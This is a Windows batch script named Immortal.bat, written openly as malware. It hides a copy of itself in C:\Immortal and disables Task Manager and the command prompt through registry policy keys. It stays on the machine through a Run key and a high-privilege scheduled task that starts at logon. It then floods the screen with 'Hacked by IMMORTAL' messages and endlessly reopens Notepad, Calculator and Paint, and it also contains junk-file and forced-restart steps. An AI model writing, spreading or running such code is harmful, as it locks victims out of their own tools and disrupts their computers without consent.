@echo off
title Immortal.bat
color 04
mode con cols=80 lines=25

:: Hide script directory
mkdir C:\Immortal 2>NUL
attrib +h C:\Immortal

:: Copy script to persist
copy "%~f0" C:\Immortal\Immortal.bat /y >NUL

:: Disable Task Manager, CMD, PowerShell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 1 /f

:: Add persistence via Registry & Task Scheduler
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Immortal" /t REG_SZ /d "C:\Immortal\Immortal.bat" /f
schtasks /create /tn "ImmortalTask" /tr "C:\Immortal\Immortal.bat" /sc ONLOGON /RL HIGHEST /F

:: Infinite pop-ups
for /l %%i in (1,1,20) do (
    start cmd /c "msg * Hacked by IMMORTAL"
    timeout /t 1 /nobreak >NUL
)

:: Open infinite apps
:loop
start notepad.exe
start calc.exe
start mspaint.exe
timeout /t 5 /nobreak >NUL
goto loop

:: Create junk files
for /l %%i in (1,1,100) do (
    echo IMMORTAL RULES > C:\Immortal\spamfile%%i.txt
)

:: Auto restart after 10 minutes
timeout /t 600 /nobreak
shutdown /r /f /t 0
